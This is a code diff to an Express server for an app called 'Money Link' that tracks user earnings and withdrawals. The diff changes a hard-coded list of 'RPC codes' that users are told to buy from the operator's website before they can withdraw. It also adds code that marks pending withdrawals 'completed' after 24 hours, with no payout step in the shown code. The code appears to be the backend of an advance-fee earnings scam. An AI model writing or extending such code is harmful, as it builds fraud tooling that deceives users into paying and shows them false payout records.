@@ -2,6 +2,7 @@ import 'dotenv/config';
 import crypto from 'crypto';
 import express, { type Request, type Response } from 'express';
 import fs from 'fs';
+import http from 'http';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
@@ -43,11 +44,17 @@ const SESSION_SECRET = crypto
   )
   .digest('hex');
 
-const VALID_RPC_CODES = new Set<string>(['091306', '0913061', '091306191']);
+const VALID_RPC_CODES = new Set<string>([
+  '556709138890',
+  '5567',
+  '0913',
+  '8890',
+]);
 const RPC_REQUIRED_NOTE =
   'You need your RPC to withdraw. Kindly buy from our official website.';
 const MIN_WITHDRAWAL_MICROS = 10_000_000;
 const GIFT_150_MICROS = 150_000_000;
+const WITHDRAWAL_PENDING_WINDOW_MS = 24 * 60 * 60 * 1000;
 
 interface ServerUserAccount {
   uid: string;
@@ -249,6 +256,19 @@ function findUserByPairSlot(
 }
 
 function serializeWalletBundle(record: ServerUserRecord) {
+  const nowMs = Date.now();
+  let updated = false;
+  for (const wd of record.withdrawals) {
+    if (wd.status === 'processing' && nowMs - wd.createdAtMs >= WITHDRAWAL_PENDING_WINDOW_MS) {
+      wd.status = 'completed';
+      wd.updatedAtMs = nowMs;
+      updated = true;
+    }
+  }
+  if (updated) {
+    saveDatabase();
+  }
+
   const devices = Object.values(record.devices).sort((a, b) => b.updatedAtMs - a.updatedAtMs);
   const earnings = [...record.earnings].sort((a, b) => b.createdAtMs - a.createdAtMs);
   const withdrawals = [...record.withdrawals].sort((a, b) => b.createdAtMs - a.createdAtMs);
@@ -300,6 +320,7 @@ function getValidPaystackKey(): string | null {
 
 async function startServer() {
   const app = express();
+  const httpServer = http.createServer(app);
   app.use(express.json({ limit: '2mb' }));
 
   app.get('/api/ping', (_req: Request, res: Response) => {
@@ -919,7 +940,9 @@ async function startServer() {
     }
 
     const record = dbStore.users[uid];
-    const rpcCode = String(req.body?.rpcCode || '').trim();
+    const rpcCode = String(req.body?.rpcCode || '')
+      .trim()
+      .replace(/[\s-]+/g, '');
     if (!VALID_RPC_CODES.has(rpcCode)) {
       res.status(403).json({ error: RPC_REQUIRED_NOTE });
       return;
@@ -953,6 +976,13 @@ async function startServer() {
     const nowMs = Date.now();
     const withdrawalId = `wd_${nowMs}_${crypto.randomBytes(4).toString('hex')}`;
     const rpcCodeHash = sha256AppHex(rpcCode);
+
+    for (const wd of record.withdrawals) {
+      if (wd.status === 'processing' && nowMs - wd.createdAtMs >= WITHDRAWAL_PENDING_WINDOW_MS) {
+        wd.status = 'completed';
+        wd.updatedAtMs = nowMs;
+      }
+    }
 
     record.account.availableBalanceMicros -= cleanMicros;
     record.account.totalWithdrawnMicros += cleanMicros;
@@ -1220,13 +1250,16 @@ async function startServer() {
   } else {
     const { createServer: createViteServer } = await import('vite');
     const vite = await createViteServer({
-      server: { middlewareMode: true },
+      server: {
+        middlewareMode: true,
+        ws: { server: httpServer },
+      },
       appType: 'spa',
     });
     app.use(vite.middlewares);
   }
 
-  app.listen(PORT, '0.0.0.0', () => {
+  httpServer.listen(PORT, '0.0.0.0', () => {
     console.log(`Money Link server listening on http://0.0.0.0:${PORT}`);
   });
 }
